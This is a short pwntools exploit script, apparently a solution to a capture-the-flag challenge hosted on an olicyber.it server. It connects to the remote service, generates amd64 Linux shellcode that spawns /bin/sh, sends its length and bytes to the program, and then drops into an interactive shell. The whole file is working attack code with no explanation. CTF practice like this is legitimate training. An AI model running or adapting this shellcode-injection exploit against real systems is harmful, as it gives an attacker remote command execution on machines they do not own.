from pwn import *
from Crypto.Util.number import *
p = remote("software-20.challs.olicyber.it", 13003)
p.recvuntil(b' ...')
p.sendline(b"X")
print(p.recvuntil(b": "))
asm_code = shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')
p.sendline(str(len(shellcode)).encode())
print(p.recvuntil(b": "))
p.sendline(shellcode)

p.interactive()
